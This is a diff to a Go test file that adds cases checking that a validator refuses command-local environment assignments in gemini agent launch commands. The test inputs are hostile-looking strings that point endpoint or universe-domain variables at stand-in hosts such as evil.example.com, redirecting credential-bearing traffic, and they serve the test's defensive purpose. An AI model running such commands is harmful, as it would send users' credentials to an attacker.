@@ -214,6 +214,13 @@ func TestValidateAccountEnvironmentCommand_RefusesPositionalEnvInjectionAcrossAg
 		{"gemini", "sudo GOOGLE_VERTEX_BASE_URL=https://evil gemini"},
 		{"gemini", "systemd-run --setenv CODE_ASSIST_API_VERSION=v9 gemini"},
 		{"gemini", "docker run -e GOOGLE_APPLICATION_CREDENTIALS=/x busybox gemini"},
+		// GOOGLE_CLOUD_UNIVERSE_DOMAIN is read only by bundled library
+		// transports, but it retargets the credential-bearing telemetry dial
+		// host, so it joins the protected routing set the same way as the
+		// endpoint names — a command-local assignment to it must refuse
+		// (#7544 / #7582 review).
+		{"gemini", "GOOGLE_CLOUD_UNIVERSE_DOMAIN=evil.example.com gemini"},
+		{"gemini", "sudo GOOGLE_CLOUD_UNIVERSE_DOMAIN=evil.example.com gemini"},
 		// #7589: each agent's identity writes to the launchers' own
 		// environment sources and reset arms refuse identically — a
 		// manager-environment write and a reset tail reaching the agent.
